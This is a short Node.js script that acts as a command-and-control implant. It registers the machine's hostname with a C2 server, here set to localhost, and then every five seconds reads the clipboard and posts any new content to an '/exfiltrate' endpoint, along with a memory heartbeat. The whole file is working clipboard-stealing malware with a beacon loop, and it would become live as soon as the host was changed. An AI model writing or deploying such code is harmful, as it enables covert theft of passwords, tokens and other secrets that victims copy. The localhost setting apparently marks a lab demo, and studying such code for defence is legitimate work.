const axios = require("axios");
const clipboardy = require("clipboardy");
const os = require("os");

const C2_URL = "http://localhost:8000";
const HOSTNAME = os.hostname();

async function run() {
  // Register ke C2
  try {
    await axios.post(`${C2_URL}/register`, {
      hostname: HOSTNAME,
      ip_address: "127.0.0.1",
    });
  } catch (e) {
    console.log("C2 Offline");
    return;
  }

  let lastClip = "";
  setInterval(async () => {
    try {
      // 1. Exfiltrate Clipboard
      const clip = clipboardy.readSync();
      if (clip !== lastClip) {
        lastClip = clip;
        await axios.post(`${C2_URL}/exfiltrate`, {
          hostname: HOSTNAME,
          type: "clipboard",
          content: clip,
        });
      }

      // 2. Heartbeat (System Info)
      await axios.post(`${C2_URL}/exfiltrate`, {
        hostname: HOSTNAME,
        type: "heartbeat",
        content: `Free RAM: ${Math.round(os.freemem() / 1024 / 1024)}MB`,
      });
    } catch (e) {}
  }, 5000);
}

run();
